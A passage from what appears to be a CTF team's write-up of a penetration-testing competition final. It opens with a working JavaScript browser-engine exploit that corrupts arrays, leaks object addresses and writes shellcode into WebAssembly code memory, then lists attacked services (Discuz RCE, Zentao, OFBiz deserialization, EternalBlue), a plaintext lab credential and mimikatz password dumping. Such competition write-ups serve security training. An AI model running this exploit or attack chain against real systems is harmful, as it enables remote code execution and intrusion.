+</span></span><span class=line><span class=cl>       <span class=n>constructor</span><span class=p>(</span><span class=n>size</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>           <span class=n>super</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>           <span class=n>this</span><span class=o>.</span><span class=n>slot</span> <span class=o>=</span> <span class=mh>0xb33f</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>foo</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>x</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=k>if</span> <span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=n>x</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=k>var</span> <span class=n>arr</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>Array</span><span class=p>(</span><span class=n>Math</span><span class=o>.</span><span class=n>sign</span><span class=p>(</span><span class=mi>0</span> <span class=o>-</span> <span class=n>Math</span><span class=o>.</span><span class=n>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl>       <span class=n>arr</span><span class=o>.</span><span class=n>shift</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>local_arr</span> <span class=o>=</span> <span class=ne>Array</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>       <span class=n>local_arr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mf>5.1</span><span class=p>;</span><span class=o>//</span><span class=mi>4014666666666666</span>
+</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>buff</span> <span class=o>=</span> <span class=n>new</span> <span class=n>LeakArrayBuffer</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>);</span><span class=o>//</span><span class=n>byteLength</span> <span class=n>idx</span><span class=o>=</span><span class=mi>8</span>
+</span></span><span class=line><span class=cl>       <span class=n>arr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x1122</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=p>[</span><span class=n>arr</span><span class=p>,</span> <span class=n>local_arr</span><span class=p>,</span> <span class=n>buff</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=k>for</span> <span class=p>(</span><span class=k>var</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x10000</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>       <span class=n>foo</span><span class=p>(</span><span class=bp>false</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>gc</span><span class=p>();</span> <span class=n>gc</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>corrput_arr</span><span class=p>,</span> <span class=n>rwarr</span><span class=p>,</span> <span class=n>corrupt_buff</span><span class=p>]</span> <span class=o>=</span> <span class=n>foo</span><span class=p>(</span><span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>corrput_arr</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x22444</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>delete</span> <span class=n>corrput_arr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>setbackingStore</span><span class=p>(</span><span class=n>hi</span><span class=p>,</span> <span class=n>low</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>rwarr</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>i2f</span><span class=p>(</span><span class=n>fLow</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=mi>4</span><span class=p>]),</span> <span class=n>hi</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>       <span class=n>rwarr</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=n>i2f</span><span class=p>(</span><span class=n>low</span><span class=p>,</span> <span class=n>fHi</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=mi>5</span><span class=p>]));</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>leakObjLow</span><span class=p>(</span><span class=n>o</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>corrupt_buff</span><span class=o>.</span><span class=n>slot</span> <span class=o>=</span> <span class=n>o</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=p>(</span><span class=n>fLow</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=mi>9</span><span class=p>])</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>corrupt_view</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DataView</span><span class=p>(</span><span class=n>corrupt_buff</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>corrupt_buffer_ptr_low</span> <span class=o>=</span> <span class=n>leakObjLow</span><span class=p>(</span><span class=n>corrupt_buff</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>idx0Addr</span> <span class=o>=</span> <span class=n>corrupt_buffer_ptr_low</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>baseAddr</span> <span class=o>=</span> <span class=p>(</span><span class=n>corrupt_buffer_ptr_low</span> <span class=o>&amp;</span> <span class=mh>0xffff0000</span><span class=p>)</span> <span class=o>-</span> <span class=p>((</span><span class=n>corrupt_buffer_ptr_low</span> <span class=o>&amp;</span> <span class=mh>0xffff0000</span><span class=p>)</span> <span class=o>%</span> <span class=mh>0x40000</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x40000</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>delta</span> <span class=o>=</span> <span class=n>baseAddr</span> <span class=o>+</span> <span class=mh>0x1c</span> <span class=o>-</span> <span class=n>idx0Addr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=k>if</span> <span class=p>((</span><span class=n>delta</span> <span class=o>%</span> <span class=mi>8</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>baseIdx</span> <span class=o>=</span> <span class=n>delta</span> <span class=o>/</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=n>this</span><span class=o>.</span><span class=n>base</span> <span class=o>=</span> <span class=n>fLow</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=n>baseIdx</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>let</span> <span class=n>baseIdx</span> <span class=o>=</span> <span class=p>((</span><span class=n>delta</span> <span class=o>-</span> <span class=p>(</span><span class=n>delta</span> <span class=o>%</span> <span class=mi>8</span><span class=p>))</span> <span class=o>/</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>       <span class=n>this</span><span class=o>.</span><span class=n>base</span> <span class=o>=</span> <span class=n>fHi</span><span class=p>(</span><span class=n>rwarr</span><span class=p>[</span><span class=n>baseIdx</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>wasmInsAddr</span> <span class=o>=</span> <span class=n>leakObjLow</span><span class=p>(</span><span class=n>wasmInstance</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>setbackingStore</span><span class=p>(</span><span class=n>wasmInsAddr</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>base</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>code_entry</span> <span class=o>=</span> <span class=n>corrupt_view</span><span class=o>.</span><span class=n>getFloat64</span><span class=p>(</span><span class=mi>13</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>setbackingStore</span><span class=p>(</span><span class=n>fLow</span><span class=p>(</span><span class=n>code_entry</span><span class=p>),</span> <span class=n>fHi</span><span class=p>(</span><span class=n>code_entry</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>   <span class=k>for</span> <span class=p>(</span><span class=n>let</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>shellcode</span><span class=o>.</span><span class=n>length</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>corrupt_view</span><span class=o>.</span><span class=n>setUint8</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>main</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>script</span><span class=o>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里生成的shellcode本来是被火绒杀的了，但是比赛到一半主办方说基于很多人没做出来，就挨个把火绒关闭了，hhh。基本上大家都能通过这个直接上线了。</p><h3 id=4智慧水利服务-1510070100>4、智慧水利服务 15.100.70.100</h3><p>这一台就有点恶心了上面有4个web题，4个flag。但是因为只有办公电脑通他。我们本地和门户均不通，所以代理这一块就很蛋疼，其实只要代理到了本地就不是很难了。
+分别是
+1、80端口 discuz 7.2的rce
+2、8080端口 禅道cnvd_2020_121325
+3、3030端口 traggo 这玩意到了后台 不知道怎么打
+4、8443端口的ofbiz 反序列化
+这里比较恶心的是禅道其实是后台洞，需要打了discuz然后根目录下拿到flag，flag文件后面留了禅道管理员的密码</p><h3 id=5工程师站1921682100>5、工程师站192.168.2.100</h3><p>在办公电脑上浏览器打开了192的一个网站，猜测存在192段的地址。然后扫描直接扫到了192.168.2.100存在永恒之蓝，正要去网上下资料的时候，主办方提供了一下“永恒之蓝利用工具”，他真的，我哭死，直接打了上192.168.2.100，</p><h3 id=6操作员站1921682210>6、操作员站192.168.2.210</h3><p>楠哥在上面玩工控的时候发现了一个账号密码信息
+Operator Station&rsquo;s
+IP:192.168.2.210
+User:monitor
+Password:nTwn3q3^ph71A
+这个是操作员站的密码，猜测是rdp的，就直接上了，然后用猕猴桃读密码rdp，管理员桌面存在一个flag和几个软件。</p><h3 id=7工控-1921682200>7、工控 192.168.2.200</h3><p>在210和110上都有一些工控相关的内容，比如210的管理员账号的浏览器默认打开了192.168.2.200
+<img src=/img/2023-08-24-DFJKfinal/3.png alt></p><p>至此渗透相关的应该都打了，其实漏洞都不是很难，主要是代理太多很难受。接下来按照题目的描述是在210上存在wireshark软件，使用wireshark抓210和220的通讯流量分析制定的题目。</p><p><img src=/img/2023-08-24-DFJKfinal/4.jpg alt></p><p><img src=/img/2023-08-24-DFJKfinal/5.jpg alt></p><p>工控wp待续&mldr;.</p><div class=blog-tags><a href=https://su-team.cn/tags/%E6%B8%97%E9%80%8F/>渗透</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/gyb-2023-su-wu/>2023 贵阳大数据网络安全精英对抗赛 SU Writeup</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/gyb-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 贵阳大数据网络安全精英对抗赛 SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/actf-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 ACTF SU WriteUp">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
+&nbsp;&bull;&nbsp;&copy;
+2026
+&nbsp;&bull;&nbsp;
+<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>
